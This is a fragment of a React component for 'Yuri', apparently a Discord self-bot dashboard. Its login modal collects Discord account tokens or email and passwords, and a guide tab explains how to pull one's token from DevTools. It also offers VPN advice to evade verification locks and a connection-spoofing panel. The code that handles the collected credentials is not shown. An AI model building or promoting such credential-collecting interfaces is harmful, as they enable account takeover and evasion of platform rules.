              animate={{ scale: 1, y: 0 }} 
              exit={{ scale: 0.95, y: 15 }}
              transition={{ duration: 0.25, ease: "easeOut" }}
              className="w-full max-w-[460px] p-6 sm:p-8 bg-black/40 border border-white/15 rounded-3xl shadow-2xl z-10 relative my-auto max-h-[92vh] overflow-y-auto custom-scrollbar backdrop-blur-2xl"
            >
              <button 
                onClick={() => {
                  cyberSound.playClick();
                  setShowAuthModal(false);
                }}
                className="absolute top-5 right-5 p-2 text-zinc-400 hover:text-white bg-white/5 hover:bg-white/10 rounded-full transition-colors cursor-pointer border border-white/10"
                title="Close"
              >
                <X className="w-4 h-4" />
              </button>

              <div className="mb-6 text-center">
                <div 
                  className="inline-flex items-center justify-center w-14 h-14 rounded-2xl bg-transparent border border-red-500/40 mb-4 shadow-[0_0_15px_rgba(239,68,68,0.2)] cursor-pointer backdrop-blur-md"
                  onClick={() => window.open('https://discord.com/login', '_blank')}
                >
                  <Crosshair className="w-7 h-7 text-red-500" />
                </div>
                
                <h2 className="text-2xl font-black tracking-tight text-white mb-1 uppercase font-mono">Sign In to Yuri</h2>
                <p className="text-xs text-zinc-300">Choose your authentication protocol to proceed</p>

                <div className="flex flex-wrap justify-center gap-2 sm:gap-4 mt-5 border-b border-white/10 pb-3">
                  <button 
                    onClick={() => {
                      cyberSound.playClick();
                      setActiveTab('login');
                    }}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-lg transition-all cursor-pointer backdrop-blur-md ${activeTab === 'login' ? 'text-white bg-transparent border border-red-500/50 shadow-[0_0_10px_rgba(239,68,68,0.2)]' : 'text-zinc-400 hover:text-zinc-200 border border-transparent'}`}
                  >
                    Token Login
                  </button>
                  <button 
                    onClick={() => {
                      cyberSound.playClick();
                      setActiveTab('email');
                    }}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-lg transition-all cursor-pointer backdrop-blur-md ${activeTab === 'email' ? 'text-white bg-transparent border border-red-500/50 shadow-[0_0_10px_rgba(239,68,68,0.2)]' : 'text-zinc-400 hover:text-zinc-200 border border-transparent'}`}
                  >
                    Email Login
                  </button>
                  <button 
                    onClick={() => {
                      cyberSound.playClick();
                      setActiveTab('oauth');
                    }}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-lg transition-all cursor-pointer backdrop-blur-md ${activeTab === 'oauth' ? 'text-white bg-transparent border border-red-500/50 shadow-[0_0_10px_rgba(239,68,68,0.2)]' : 'text-zinc-400 hover:text-zinc-200 border border-transparent'}`}
                  >
                    OAuth
                  </button>
                  <button 
                    onClick={() => {
                      cyberSound.playClick();
                      setActiveTab('getToken');
                    }}
                    className={`text-xs font-semibold px-2.5 py-1 rounded-lg transition-all cursor-pointer backdrop-blur-md ${activeTab === 'getToken' ? 'text-white bg-transparent border border-red-500/50 shadow-[0_0_10px_rgba(239,68,68,0.2)]' : 'text-zinc-400 hover:text-zinc-200 border border-transparent'}`}
                  >
                    Guide
                  </button>
                </div>
              </div>

              {activeTab === 'oauth' ? (
                <div className="space-y-5">
                  <div className="p-3.5 rounded-xl bg-transparent border border-amber-500/30 text-amber-200 text-xs leading-relaxed backdrop-blur-md">
                    <p className="font-semibold text-amber-400 mb-1">⚠️ Note on OAuth:</p>
                    <p>
                      OAuth provides dashboard viewing access. Full Discord client automation, RPC customization, and gateway voice operations require an account Token.
                    </p>
                  </div>

                  <button
                    onClick={handleDiscordLogin}
                    className="w-full py-3.5 bg-transparent hover:bg-indigo-600/20 text-indigo-300 hover:text-white border border-indigo-500/40 font-medium text-sm rounded-xl transition-all flex items-center justify-center gap-2.5 shadow-[0_0_15px_rgba(99,102,241,0.2)] cursor-pointer backdrop-blur-md"
                  >
                    <span>Authorize with Discord OAuth</span>
                  </button>
                  {error && (
                    <div className="text-red-400 text-xs text-center font-medium bg-transparent border border-red-400/30 py-2 rounded-lg backdrop-blur-md">{error}</div>
                  )}
                </div>
              ) : activeTab === 'login' ? (
                <form onSubmit={handleTokenSubmit} className="space-y-4">
                  <div>
                    <input
                      type="password"
                      value={token}
                      onChange={(e) => setToken(e.target.value)}
                      placeholder="Discord Account Token"
                      className="w-full px-4 py-3.5 bg-black/25 border border-white/15 rounded-xl focus:outline-none focus:border-red-500/60 transition-all placeholder:text-zinc-500 text-white text-sm font-mono backdrop-blur-sm"
                      required
                    />
                  </div>

                  {error && (
                    <div className="text-red-400 text-xs text-center font-medium bg-transparent border border-red-400/30 py-2 rounded-lg backdrop-blur-md">{error}</div>
                  )}

                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full py-3.5 bg-transparent hover:bg-red-500/20 text-red-400 hover:text-white border border-red-500/40 font-semibold text-sm rounded-xl transition-all disabled:opacity-50 cursor-pointer shadow-[0_0_15px_rgba(239,68,68,0.2)] backdrop-blur-md"
                  >
                    {loading ? 'Authenticating...' : 'Enter Yuri Dashboard'}
                  </button>
                </form>
              ) : activeTab === 'email' ? (
                <form onSubmit={handleEmailSubmit} className="space-y-4">
                  <div className="bg-transparent border border-red-500/30 rounded-xl p-3 flex gap-2.5 text-red-200 backdrop-blur-md">
                    <ShieldAlert className="w-4 h-4 shrink-0 text-red-400 mt-0.5" />
                    <div className="text-xs">
                      <p className="font-semibold text-red-400">VPN Recommended:</p>
                      <p>Enable VPN before logging in with email/password to prevent Discord verification lock.</p>
                    </div>
                  </div>

                  <div className="space-y-3">
                    <input
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="Discord Email"
                      className="w-full px-4 py-3 bg-black/25 border border-white/15 rounded-xl focus:outline-none focus:border-red-500/60 transition-all placeholder:text-zinc-500 text-white text-sm backdrop-blur-sm"
                      required
                    />
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Discord Password"
                      className="w-full px-4 py-3 bg-black/25 border border-white/15 rounded-xl focus:outline-none focus:border-red-500/60 transition-all placeholder:text-zinc-500 text-white text-sm backdrop-blur-sm"
                      required
                    />
                  </div>

                  {copySuccess && (
                    <div className="text-emerald-400 text-xs text-center font-medium bg-transparent border border-emerald-500/30 py-2 px-3 rounded-lg backdrop-blur-md flex items-center justify-center gap-2">
                      <Check className="w-3.5 h-3.5" />
                      <span>Token extracted &amp; copied! Logging in...</span>
                    </div>
                  )}

                  {error && (
                    <div className="text-red-400 text-xs text-center font-medium bg-transparent border border-red-400/30 py-2 rounded-lg backdrop-blur-md">{error}</div>
                  )}

                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full py-3.5 bg-transparent hover:bg-red-500/20 text-red-400 hover:text-white border border-red-500/40 font-semibold text-sm rounded-xl transition-all disabled:opacity-50 cursor-pointer shadow-[0_0_15px_rgba(239,68,68,0.2)] backdrop-blur-md flex items-center justify-center gap-2"
                  >
                    {loading && <span className="w-3.5 h-3.5 border-2 border-white/20 border-t-white rounded-full animate-spin"/>}
                    <span>{loading ? 'Extracting & Logging in...' : 'Extract Token & Login'}</span>
                  </button>
                </form>
              ) : (
                <div className="space-y-4 text-xs text-zinc-300 bg-black/20 p-4 rounded-xl border border-white/10 backdrop-blur-md">
                  <p className="font-semibold text-white text-sm">How to get your Discord token:</p>
                  <ol className="list-decimal list-outside ml-4 space-y-2 font-sans">
                    <li>Open Discord in your browser and sign in.</li>
                    <li>Press <code className="bg-transparent border border-white/20 text-zinc-200 px-1 py-0.5 rounded font-mono">Ctrl + Shift + I</code> to open DevTools.</li>
                    <li>Click the <span className="text-zinc-200 font-medium">Network</span> tab.</li>
                    <li>Press <code className="bg-transparent border border-white/20 text-zinc-200 px-1 py-0.5 rounded font-mono">F5</code> to reload.</li>
                    <li>Filter by <code className="bg-transparent border border-white/20 text-red-300 px-1 py-0.5 rounded font-mono">/api/v9/users/@me</code>.</li>
                    <li>Select the request and find <span className="text-zinc-200 font-medium">Authorization</span> under Request Headers.</li>
                  </ol>
                </div>
              )}

              <div className="mt-6 pt-4 border-t border-white/10">
                <label className="flex items-center gap-2.5 cursor-pointer group">
                  <div className="relative flex items-center justify-center">
                    <input 
                      type="checkbox" 
                      className="sr-only" 
                      checked={termsAccepted}
                      onChange={(e) => handleAcceptTerms(e.target.checked)}
                    />
                    <div className={`w-4 h-4 rounded border flex items-center justify-center transition-all ${termsAccepted ? 'bg-red-600 border-red-500' : 'bg-transparent border-white/20 group-hover:border-white/40'}`}>
                      {termsAccepted && <Check className="w-3 h-3 text-white" />}
                    </div>
                  </div>
                  <p className="text-[11px] text-zinc-300 select-none">
                    I agree to Yuri's <button type="button" onClick={(e) => { e.preventDefault(); setShowTermsModal(true); }} className="text-zinc-200 hover:text-white underline transition-colors cursor-pointer">Terms of Service</button> and <button type="button" onClick={(e) => { e.preventDefault(); setShowPrivacyModal(true); }} className="text-zinc-200 hover:text-white underline transition-colors cursor-pointer">Privacy Policy</button>.
                  </p>
                </label>
              </div>

              <div className="mt-4 text-center">
                <button
                  type="button"
                  onClick={() => setShowAuthModal(false)}
                  className="text-xs text-zinc-400 hover:text-white transition-colors cursor-pointer"
                >
                  ← Return to Overview
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {showTermsModal && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/60 backdrop-blur-xl"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 15 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.95, y: 15 }}
              className="w-full max-w-lg bg-black/40 border border-white/15 rounded-3xl shadow-2xl overflow-hidden flex flex-col max-h-[80vh] backdrop-blur-2xl"
            >
              <div className="p-5 border-b border-white/10 flex items-center justify-between bg-white/[0.02] backdrop-blur-md">
                <h3 className="text-lg font-semibold text-white">Terms of Service</h3>
                <button onClick={() => setShowTermsModal(false)} className="p-1.5 text-zinc-400 hover:text-white transition-colors bg-white/5 border border-white/10 rounded-xl cursor-pointer">
                  <X className="w-4 h-4" />
                </button>
              </div>
              <div className="p-6 overflow-y-auto text-xs text-zinc-300 leading-relaxed custom-scrollbar space-y-3 bg-transparent">
                <p>
                  <strong>1. Acceptance of Terms:</strong> By accessing or using Yuri, you confirm that you have read, understood, and agreed to be bound by these Terms of Service.
                </p>
                <p>
                  <strong>2. Use of Service:</strong> Yuri is provided as a third-party application dashboard. You agree to use the service responsibly and in compliance with all applicable local, national, and international laws.
                </p>
                <p>
                  <strong>3. Interaction with Discord API and Potential Risks:</strong> Third-party clients and automation functionalities are strictly against Discord's Terms of Service. You acknowledge that you use Yuri at your entirely own personal risk.
                </p>
                <p>
                  <strong>4. Local Processing:</strong> Tokens are processed locally in your session and never stored or broadcast to remote third-party servers.
                </p>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {showPrivacyModal && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/60 backdrop-blur-xl"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 15 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.95, y: 15 }}
              className="w-full max-w-lg bg-black/40 border border-white/15 rounded-3xl shadow-2xl overflow-hidden flex flex-col max-h-[80vh] backdrop-blur-2xl"
            >
              <div className="p-5 border-b border-white/10 flex items-center justify-between bg-white/[0.02] backdrop-blur-md">
                <h3 className="text-lg font-semibold text-white">Privacy Policy</h3>
                <button onClick={() => setShowPrivacyModal(false)} className="p-1.5 text-zinc-400 hover:text-white transition-colors bg-white/5 border border-white/10 rounded-xl cursor-pointer">
                  <X className="w-4 h-4" />
                </button>
              </div>
              <div className="p-6 overflow-y-auto text-xs text-zinc-300 leading-relaxed custom-scrollbar space-y-3 bg-transparent">
                <p>
                  <strong>1. Data Collection:</strong> When you use Yuri and authenticate, your Discord token is stored entirely locally on your device within your browser's local storage or memory. We do not transmit tokens to any third-party databases.
                </p>
                <p>
                  <strong>2. Data Usage:</strong> Your tokens are strictly used to authenticate your session directly with the Discord API to enable the features within the Yuri dashboard.
                </p>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {showVpnModal && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xl"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 15 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.95, y: 15 }}
              className="w-full max-w-md bg-black/40 border border-white/15 rounded-3xl shadow-2xl overflow-hidden flex flex-col max-h-[80vh] backdrop-blur-2xl"
            >
              <div className="p-5 border-b border-white/10 flex items-center justify-between bg-white/[0.02] backdrop-blur-md">
                <div className="flex items-center gap-2.5">
                  <div className="w-8 h-8 rounded-xl bg-transparent border border-red-500/30 flex items-center justify-center text-red-400 backdrop-blur-md">
                    <Globe className="w-4 h-4" />
                  </div>
                  <div>
                    <h3 className="text-sm font-semibold text-white">Yuri Routing Shield</h3>
                    <p className="text-[11px] text-zinc-400">Spoof connection node &amp; gateway</p>
                  </div>
                </div>
                <button onClick={() => setShowVpnModal(false)} className="p-1.5 text-zinc-400 hover:text-white bg-white/5 border border-white/10 rounded-xl cursor-pointer">
                  <X className="w-4 h-4" />
                </button>
              </div>

              <div className="p-5 space-y-3 overflow-y-auto custom-scrollbar bg-transparent">
                <div className="relative">
                  <Search className="w-3.5 h-3.5 text-zinc-400 absolute left-3 top-1/2 -translate-y-1/2" />
                  <input
                    type="text"
                    value={vpnSearch}
                    onChange={(e) => setVpnSearch(e.target.value)}
                    placeholder="Search locations..."
                    className="w-full bg-black/25 border border-white/15 rounded-xl py-2.5 pl-9 pr-4 text-xs text-white focus:outline-none focus:border-red-500/60 backdrop-blur-sm placeholder:text-zinc-500"
                  />
                </div>

                <div className="space-y-1.5">
                  {VPN_COUNTRIES.filter(c => c.name.toLowerCase().includes(vpnSearch.toLowerCase()) || c.id.toLowerCase().includes(vpnSearch.toLowerCase())).map((country) => (
                    <button
                      key={country.id}
                      onClick={() => setVpnCountry(country)}
                      className={`w-full flex items-center justify-between p-2.5 rounded-xl border transition-all cursor-pointer backdrop-blur-md ${
                        vpnCountry.id === country.id 
                          ? 'bg-transparent border-red-500/40 shadow-[0_0_10px_rgba(239,68,68,0.2)]' 
                          : 'bg-black/20 border-white/10 hover:border-white/20'
                      }`}
                    >
                      <div className="flex items-center gap-2.5">
                        <span className="text-lg">{country.flag}</span>
                        <span className="text-xs font-medium text-zinc-200">{country.name}</span>
                      </div>
                      <div className="flex items-center gap-2.5">
                        <span className="text-[11px] text-zinc-400 font-mono">{country.latency}</span>
                        <div className={`w-2.5 h-2.5 rounded-full border-2 ${vpnCountry.id === country.id ? 'border-red-500 bg-red-500' : 'border-zinc-600'}`} />
                      </div>
                    </button>
                  ))}
                </div>
              </div>

              <div className="p-4 border-t border-white/10 bg-transparent backdrop-blur-md">
                <button
                  onClick={() => {
                    setVpnEnabled(!vpnEnabled);
                    if (!vpnEnabled) setTimeout(() => setShowVpnModal(false), 500);
                  }}
                  className={`w-full py-3 rounded-xl font-semibold text-xs flex items-center justify-center gap-2 transition-all cursor-pointer backdrop-blur-md ${
                    vpnEnabled 
                      ? 'bg-transparent border border-emerald-500/40 text-emerald-400 shadow-[0_0_15px_rgba(16,185,129,0.2)]' 
                      : 'bg-transparent hover:bg-red-500/20 text-red-400 hover:text-white border border-red-500/40 shadow-[0_0_15px_rgba(239,68,68,0.2)]'
                  }`}
                >
                  <Shield className="w-4 h-4" />
                  {vpnEnabled ? 'Connected via ' + vpnCountry.name : 'Activate Node Shield'}
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {showCommunityModal && (
          <motion.div 
            initial={{ opacity: 0 }} 
            animate={{ opacity: 1 }} 
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xl"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 15 }} 
              animate={{ scale: 1, y: 0 }} 
              exit={{ scale: 0.95, y: 15 }}
              className="w-full max-w-md bg-black/40 border border-[#5865F2]/30 rounded-3xl shadow-2xl overflow-hidden flex flex-col relative p-6 text-center backdrop-blur-2xl"
            >
              <button 
                onClick={() => setShowCommunityModal(false)} 
                className="absolute top-4 right-4 p-1.5 text-zinc-400 hover:text-white bg-white/5 border border-white/10 rounded-full cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>

              <div className="w-16 h-16 mx-auto rounded-2xl bg-transparent border border-[#5865F2]/40 flex items-center justify-center text-[#5865F2] mb-4 shadow-[0_0_20px_rgba(88,101,242,0.2)] backdrop-blur-md">
                <MessageSquare className="w-8 h-8" />
              </div>

              <h3 className="text-xl font-bold text-white mb-1">Official Yuri Community</h3>
              <p className="text-xs text-zinc-300 mb-6 max-w-xs mx-auto">
                Join our private community for Lua script drops, fast-track whitelisting, and real-time announcements.
              </p>

              <button
                onClick={handleCopyCommunityLink}
                className={`w-full py-3.5 rounded-xl font-semibold text-xs flex items-center justify-center gap-2 transition-all cursor-pointer backdrop-blur-md ${
                  communityCopied 
                    ? 'bg-transparent border border-emerald-500/40 text-emerald-400 shadow-[0_0_15px_rgba(16,185,129,0.2)]' 
                    : 'bg-transparent hover:bg-[#5865F2]/20 text-[#5865F2] hover:text-white border border-[#5865F2]/40 shadow-[0_0_15px_rgba(88,101,242,0.2)]'
                }`}
              >
                {communityCopied ? (
                  <>
                    <Check className="w-4 h-4 text-emerald-400" />
                    <span>Copied &amp; Opening Server!</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4" />
                    <span>Copy Link &amp; Join Discord</span>
                  </>
                )}
              </button>

              <div className="mt-4 text-[11px] font-mono text-zinc-400">
                discord.gg/eaEB3q7pEb
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="fixed bottom-4 right-4 z-40 flex items-center gap-3 bg-black/25 backdrop-blur-xl border border-white/15 px-3.5 py-2 rounded-2xl shadow-2xl">
        <button
          onClick={toggleBgm}
          className="w-8 h-8 rounded-xl bg-transparent border border-red-500/40 flex items-center justify-center text-red-400 hover:scale-105 transition-transform backdrop-blur-md cursor-pointer shadow-[0_0_10px_rgba(239,68,68,0.2)]"
          title={bgmPlaying ? "Pause BGM" : "Play BGM"}
        >
          {bgmPlaying ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5 ml-0.5" />}
        </button>
        <div className="flex flex-col pr-1">
          <div className="flex items-center gap-2">
            <span className="text-[10px] font-bold text-white tracking-tight">strangers (ultra slowed)</span>
            <span className="text-[8px] font-mono px-1.5 py-0.2 bg-transparent text-red-400 border border-red-500/30 rounded backdrop-blur-sm">LOOP [∞]</span>
          </div>
          <span className="text-[9px] text-zinc-400 font-mono tracking-tighter">proderics, melodybloom</span>
        </div>
        <div className="flex items-center gap-0.5 h-3 px-1">
          <span className={`w-0.5 rounded-full bg-red-500 transition-all ${bgmPlaying ? 'h-3 animate-pulse' : 'h-1'}`} />
          <span className={`w-0.5 rounded-full bg-red-400 transition-all ${bgmPlaying ? 'h-2 animate-bounce' : 'h-1'}`} />
          <span className={`w-0.5 rounded-full bg-red-600 transition-all ${bgmPlaying ? 'h-3.5 animate-pulse' : 'h-1'}`} />
        </div>
      </div>
    </div>
  );
}
